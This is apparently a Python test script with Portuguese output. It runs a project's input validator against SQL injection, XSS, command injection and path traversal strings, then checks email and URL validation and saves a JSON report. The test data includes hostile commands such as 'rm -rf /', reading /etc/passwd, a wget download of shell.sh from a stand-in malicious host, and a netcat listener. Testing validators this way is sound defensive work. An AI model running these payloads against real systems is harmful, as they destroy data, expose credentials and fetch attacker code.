#!/usr/bin/env python3
"""Script de teste abrangente do sistema de validação de segurança."""

import json
import time
from datetime import datetime
from atous_sec_network.security.input_validator import (
    validate_input, validate_email, validate_url, validate_json, validate_filename
)

def run_security_tests():
    """Executa testes abrangentes do sistema de segurança."""
    print("=" * 80)
    print("RELATÓRIO DE TESTE DO SISTEMA DE DEFESA ATOUS SECURE NETWORK")
    print("=" * 80)
    print(f"Data/Hora: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("\n")
    
    test_results = {
        "timestamp": datetime.now().isoformat(),
        "total_tests": 0,
        "passed_tests": 0,
        "failed_tests": 0,
        "categories": {}
    }
    
    # Testes de SQL Injection
    print("1. TESTES DE SQL INJECTION")
    print("-" * 40)
    sql_tests = [
        "SELECT * FROM users WHERE id = '1' OR '1'='1'",
        "'; DROP TABLE users; --",
        "1' UNION SELECT username, password FROM users--",
        "admin'--",
        "' OR 1=1#"
    ]
    
    sql_results = []
    for i, test_case in enumerate(sql_tests, 1):
        result = validate_input(test_case)
        is_blocked = not result["valid"] and "sql_injection" in result["threats"]
        sql_results.append({
            "test": test_case,
            "blocked": is_blocked,
            "threats": result["threats"]
        })
        print(f"  {i}. {test_case[:50]}... -> {'BLOQUEADO' if is_blocked else 'FALHOU'}")
        test_results["total_tests"] += 1
        if is_blocked:
            test_results["passed_tests"] += 1
        else:
            test_results["failed_tests"] += 1
    
    test_results["categories"]["sql_injection"] = sql_results
    
    # Testes de XSS
    print("\n2. TESTES DE XSS (CROSS-SITE SCRIPTING)")
    print("-" * 40)
    xss_tests = [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "javascript:alert('xss')",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<svg onload=alert('xss')></svg>"
    ]
    
    xss_results = []
    for i, test_case in enumerate(xss_tests, 1):
        result = validate_input(test_case)
        is_blocked = not result["valid"] and "xss" in result["threats"]
        xss_results.append({
            "test": test_case,
            "blocked": is_blocked,
            "threats": result["threats"]
        })
        print(f"  {i}. {test_case[:50]}... -> {'BLOQUEADO' if is_blocked else 'FALHOU'}")
        test_results["total_tests"] += 1
        if is_blocked:
            test_results["passed_tests"] += 1
        else:
            test_results["failed_tests"] += 1
    
    test_results["categories"]["xss"] = xss_results
    
    # Testes de Command Injection
    print("\n3. TESTES DE COMMAND INJECTION")
    print("-" * 40)
    cmd_tests = [
        "ls -la; rm -rf /",
        "cat /etc/passwd",
        "wget http://malicious.com/shell.sh",
        "nc -l 4444",
        "ping google.com && rm file.txt"
    ]
    
    cmd_results = []
    for i, test_case in enumerate(cmd_tests, 1):
        result = validate_input(test_case)
        is_blocked = not result["valid"] and "command_injection" in result["threats"]
        cmd_results.append({
            "test": test_case,
            "blocked": is_blocked,
            "threats": result["threats"]
        })
        print(f"  {i}. {test_case[:50]}... -> {'BLOQUEADO' if is_blocked else 'FALHOU'}")
        test_results["total_tests"] += 1
        if is_blocked:
            test_results["passed_tests"] += 1
        else:
            test_results["failed_tests"] += 1
    
    test_results["categories"]["command_injection"] = cmd_results
    
    # Testes de Path Traversal
    print("\n4. TESTES DE PATH TRAVERSAL")
    print("-" * 40)
    path_tests = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
        "..%252f..%252f..%252fetc%252fpasswd"
    ]
    
    path_results = []
    for i, test_case in enumerate(path_tests, 1):
        result = validate_input(test_case)
        is_blocked = not result["valid"] and "path_traversal" in result["threats"]
        path_results.append({
            "test": test_case,
            "blocked": is_blocked,
            "threats": result["threats"]
        })
        print(f"  {i}. {test_case[:50]}... -> {'BLOQUEADO' if is_blocked else 'FALHOU'}")
        test_results["total_tests"] += 1
        if is_blocked:
            test_results["passed_tests"] += 1
        else:
            test_results["failed_tests"] += 1
    
    test_results["categories"]["path_traversal"] = path_results
    
    # Testes de Validação de Email
    print("\n5. TESTES DE VALIDAÇÃO DE EMAIL")
    print("-" * 40)
    email_tests = [
        ("user@example.com", True),
        ("test.email+tag@domain.co.uk", True),
        ("invalid-email", False),
        ("@domain.com", False),
        ("user@", False)
    ]
    
    email_results = []
    for i, (email, expected) in enumerate(email_tests, 1):
        result = validate_email(email)
        is_correct = result == expected
        email_results.append({
            "email": email,
            "expected": expected,
            "result": result,
            "correct": is_correct
        })
        print(f"  {i}. {email} -> {'VÁLIDO' if result else 'INVÁLIDO'} ({'✓' if is_correct else '✗'})")
        test_results["total_tests"] += 1
        if is_correct:
            test_results["passed_tests"] += 1
        else:
            test_results["failed_tests"] += 1
    
    test_results["categories"]["email_validation"] = email_results
    
    # Testes de Validação de URL
    print("\n6. TESTES DE VALIDAÇÃO DE URL")
    print("-" * 40)
    url_tests = [
        ("https://example.com", True),
        ("http://subdomain.domain.com/path", True),
        ("not-a-url", False),
        ("ftp://files.example.com", True),
        ("javascript:alert('xss')", False)
    ]
    
    url_results = []
    for i, (url, expected) in enumerate(url_tests, 1):
        result = validate_url(url)
        is_correct = result == expected
        url_results.append({
            "url": url,
            "expected": expected,
            "result": result,
            "correct": is_correct
        })
        print(f"  {i}. {url} -> {'VÁLIDA' if result else 'INVÁLIDA'} ({'✓' if is_correct else '✗'})")
        test_results["total_tests"] += 1
        if is_correct:
            test_results["passed_tests"] += 1
        else:
            test_results["failed_tests"] += 1
    
    test_results["categories"]["url_validation"] = url_results
    
    # Resumo dos resultados
    print("\n" + "=" * 80)
    print("RESUMO DOS RESULTADOS")
    print("=" * 80)
    print(f"Total de testes executados: {test_results['total_tests']}")
    print(f"Testes aprovados: {test_results['passed_tests']}")
    print(f"Testes falharam: {test_results['failed_tests']}")
    
    success_rate = (test_results['passed_tests'] / test_results['total_tests']) * 100
    print(f"Taxa de sucesso: {success_rate:.1f}%")
    
    if success_rate >= 90:
        print("\n🟢 SISTEMA DE SEGURANÇA: EXCELENTE")
    elif success_rate >= 75:
        print("\n🟡 SISTEMA DE SEGURANÇA: BOM")
    else:
        print("\n🔴 SISTEMA DE SEGURANÇA: NECESSITA MELHORIAS")
    
    # Salvar relatório em JSON
    with open('security_test_report.json', 'w', encoding='utf-8') as f:
        json.dump(test_results, f, indent=2, ensure_ascii=False)
    
    print(f"\nRelatório detalhado salvo em: security_test_report.json")
    print("=" * 80)
    
    return test_results

if __name__ == "__main__":
    run_security_tests()